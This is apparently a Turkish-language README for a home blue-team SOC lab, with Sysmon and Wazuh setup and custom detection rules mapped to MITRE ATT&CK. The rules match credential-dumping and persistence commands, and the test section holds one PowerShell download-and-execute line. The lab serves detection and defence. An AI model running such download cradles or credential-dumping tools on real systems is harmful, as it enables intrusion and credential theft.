# SOC-Home-Lab-Project
# 🛡️ Enterprise Home SOC & Telemetry Detection Lab

## 📌 Proje Özeti
Bu proje, kurumsal bir ağ ortamındaki saldırı vektörlerini tespit etmek, sistem telemetrisini (loglarını) toplamak ve
SIEM paneli üzerinde analiz etmek amacıyla oluşturulmuş canlı bir Mavi Takım (Blue Team) laboratuvarıdır.

## 📐 Ağ ve Sistem Mimarisi
- **Kurban Makine (Target):** Windows 10/11 Enterprise (Sysmon Entegreli)
- **SIEM & Log Toplayıcı (Analist):** Ubuntu Server / Wazuh SIEM & Elastic Stack
- **Saldırgan Makine (Attacker):** Kali Linux
- **Ağ Yapılandırması:** Isolated Host-Only Network (192.168.56.0/24)

## 🛠️ Kullanılan Teknolojiler ve Araçlar
- **Sistem & İzleme:** Windows Event Logs, Sysmon (SwiftOnSecurity Config)
- **SIEM / EDR:** Wazuh Dashboard / Elastic Stack (ELK)
- **Trafik Analizi:** Wireshark, Zeek
- **Otomasyon & Scripting:** Python (Log parser), PowerShell

## 🎯 Test Edilen Saldırı Senaryoları ve Event ID Karşılıkları
| Saldırı Türü | Kullanılan Araç | Tespit Edilen Event ID / Kural |
| :--- | :--- | :--- |
| **RDP Brute Force** | Hydra / Crowbar | Windows Event ID 4625 (Failed Logon) |
| **Zararlı Kod Çalıştırma** | PowerShell Empire / Mimikatz | Sysmon Event ID 1 (Process Creation) & Event ID 10 (ProcessAccess) |
| **Ağ Taraması** | Nmap | Suricata / Wireshark TCP SYN Flood Alert |

## 📸 Ekran Görüntüleri ve Analiz Raporları
*(Laboratuvar kurulumu tamamlandıkça SIEM paneli ve log ekran görüntüleri buraya eklenecektir.)*  
---

### 🟢 Tamamlanan Faz 1: Sysmon & Wazuh Telemetri Entegrasyonu

Windows 10 kurban makinesindeki Sysmon loglarının (`Microsoft-Windows-Sysmon/Operational`)
Wazuh SIEM ortamına aktarılması için ajan konfigürasyonu tamamlanmıştır.

#### 🛠️ Uygulanan Ajan Konfigürasyonu (`ossec.conf`)
```xml
<ossec_config>
  <client>
    <server>
      <address>192.168.42.130</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
  </client>
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</ossec_config>

## 🟢 Tamamlanan Faz 2: Özel Tespit Kuralları (Custom Rules) ve Otomatik Müdahale (Active Response)

Sysmon ve Wazuh entegrasyonunun ardından, varsayılan kuralların yakalayamadığı gelişmiş saldırı vektörleri için
 özel tespit kuralları yazılmış ve tespit anında otomatik müdahale (containment) sağlayan Active Response mekanizması devreye alınmıştır.

### 🎯 Yapılandırılan Özel Kurallar (`local_rules.xml`)

MITRE ATT&CK çerçevesiyle eşleştirilmiş ve `/var/ossec/etc/rules/local_rules.xml` dosyasına eklenmiş kurallar:

| Kural ID | Saldırı Senaryosu | Mantık / Regex Şablonu | MITRE Taktik | MITRE Teknik ID |
| :--- | :--- | :--- | :--- | :--- |
| **`100002`** | Execution Policy Bypass | `-ExecutionPolicy Bypass` / `-ep bypass` | Defense Evasion | `T1059.001` (PowerShell) |
| **`100003`** | Zararlı Kod İndirme / Parola Sızdırma | `DownloadString`, `sekurlsa`, `lsadump`, `mimikatz` | Credential Access / Execution | `T1003` / `T1105` |
| **`100004`** | Zamanlanmış Görev ile Kalıcılık | `schtasks /create`, `HKCU\...\Run` | Persistence | `T1053.005` / `T1547.001` |

#### Uygulanan Kural Konfigürasyonu (`local_rules.xml`)
```xml
<group name="sysmon,powershell,custom_rules">

  <!-- Kural 100002: Execution Policy Bypass -->
  <rule id="100002" level="8">
    <if_sid>61600</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-ExecutionPolicy\s+Bypass|-ep\s+bypass</field>
    <description>Suspicious PowerShell Execution Policy Bypass Detected</description>
    <mitre><id>T1059.001</id></mitre>
  </rule>

  <!-- Kural 100003: Credential Dumping / Fileless Malware -->
  <rule id="100003" level="10">
    <if_sid>61600</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)DownloadString|sekurlsa|lsadump|mimikatz</field>
    <description>Suspicious Process Execution: Credential Access / Download Attempt</description>
    <mitre>
      <id>T1003</id>
      <id>T1105</id>
    </mitre>
  </rule>

  <!-- Kural 100004: Persistence Execution -->
  <rule id="100004" level="8">
    <if_sid>61600</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)schtasks\s+/create|reg\s+add.*\\run</field>
    <description>Suspicious Persistence Mechanism Created via CLI</description>
    <mitre>
      <id>T1053.005</id>
      <id>T1547.001</id>
    </mitre>
  </rule>

</group>



⚡ Otomatik Müdahale (Active Response) Entegrasyonu
Zararlı kod çalıştırma girişimi tespit edildiğinde insan müdahalesi beklenmeden uç noktada sürecin kesilmesi sağlanmıştır.

Mühendislik & Analiz Notu (Kısıtların Çözümü):
Kaynak IP Bağımlılığı (srcip): host-deny veya güvenlik duvarı engellemeleri log içinde srcip (Kaynak IP) bilgisine ihtiyaç duyar.
Süreç oluşturma (Sysmon Event ID 1) loglarında IP bilgisi bulunmadığı için komut satırı tetiklemelerinde uç nokta servis müdahalesi tercih edilmiştir.

İşletim Sistemi Betik Uyumluluğu: Windows uç noktalarında Linux kabuk betikleri (.sh) çalışmayacağı için Windows'a özel derlenmiş .exe executable araçları (restart-wazuh.exe) aktif edilmiştir.

Uygulanan Active Response Konfigürasyonu (ossec.conf)
XML
<!-- Rule 100003 Tetiklendiğinde Agent Servisini Yeniden Başlatma -->
<active-response>
  <command>restart-wazuh</command>
  <location>local</location>
  <rules_id>100003</rules_id>
</active-response>
🧪 Test ve Doğrulama Adımları
Saldırı Simülasyonu (Windows 10):

PowerShell
powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('[http://example.com/test](http://example.com/test)')"
SIEM Paneli Doğrulaması:

100003 numaralı kural tetiklendi ve Wazuh Dashboard üzerinde Level 10 kritikte alarm oluşturuldu.

Active Response Doğrulaması:

Target makine üzerindeki C:\Program Files (x86)\ossec-agent\active-response\active-responses.log dosyası incelendi.

active-response/bin/restart-wazuh.exe: Starting kaydıyla otomatik müdahalenin başarıyla gerçekleştiği doğrulandı.
